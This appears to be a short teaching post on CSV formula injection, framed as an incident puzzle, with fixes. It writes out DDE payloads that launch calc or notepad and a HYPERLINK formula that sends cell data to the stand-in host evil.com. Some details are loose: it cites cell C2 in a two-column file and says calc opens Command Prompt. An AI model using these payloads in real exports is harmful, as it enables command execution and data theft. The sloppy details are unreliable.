# The 3AM Page: The Excel Bomb

It's 9:00 AM. Finance is screaming.

**Finance:** "Our CSV export opened in Excel and executed a formula. Transferred $50K to an unknown account."

You check the CSV:
```csv
name,amount
Alice,1000
Bob,=CMD|' /C calc'!A0
```

Excel executed the formula in cell C2. On Windows, this opens Command Prompt.

**Your CSV parser never sanitized cell contents.** It treated data as... data. But Excel treats formulas as code.

---

## Your Turn

### Q1: Why is a CSV file dangerous? It's just text.

<br><br><br><br><br>

---

## The Autopsy

### Answer: Applications interpret data as code

CSV is "Comma-Separated Values." But Excel, Google Sheets, and LibreOffice:
- Parse cells starting with `=`, `+`, `-`, `@` as formulas
- Formulas can execute system commands
- Formulas can exfiltrate data to external servers

**The DDE attack:**
```
=cmd|' /C notepad'!A0
=SUM(A1:A10)                    // Normal formula
=HYPERLINK("http://evil.com?data=" & A1, "Click")  // Data exfiltration
```

**Your parser isn't the problem. The application opening the CSV is.**

### The Fix

**Option 1:** Prefix dangerous cells with a tab character:
```csv
name,amount
Alice,1000
Bob,	=CMD|' /C calc'!A0
```

Excel treats the tab-prefixed cell as text, not a formula.

**Option 2:** Quote all cells and escape special characters.

**Option 3:** Use a format that doesn't support formulas (JSON, Parquet).
